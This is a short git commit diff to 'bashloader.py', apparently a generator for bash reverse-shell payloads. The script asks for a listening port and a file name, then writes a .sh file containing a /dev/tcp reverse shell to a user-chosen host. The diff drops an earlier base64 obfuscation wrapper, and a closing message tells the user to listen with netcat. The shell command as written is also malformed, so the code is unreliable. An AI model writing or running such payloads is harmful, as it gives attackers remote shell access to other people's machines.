f6eb8727cfafd45ce35fb6151784369e7bce6bf4
Guille-ux <104579306+Guille-ux@users.noreply.github.com>
2022-07-14 15:57:55 +0200

    Update bashloader.py

--- bashloader.py
+++ bashloader.py
@@ -1,6 +1,5 @@
 import os
 import time
-import base64
 
 os.chdir("../output/")
 time.sleep(0.5)
@@ -9,8 +8,7 @@ opt2 = input("LPORT: ")
 opt3 = input("name: ")
 op = open(opt3 + ".sh", "w")
 cod = "bash -c '-i >& /dev/tcp/{}/{} >&1'".format(opt, opt2)
-cod1 = base64.b64encode(bytes(cod))
-op1 = op.write("echo " + cod + "| base64 -d | bash -c | bash 2>/dev/null")
+op1 = op.write(cod)
 op.close()
 time.sleep(0.1)
 print("WARNING: you need necat to connect using nc -lvnp <PORT>")
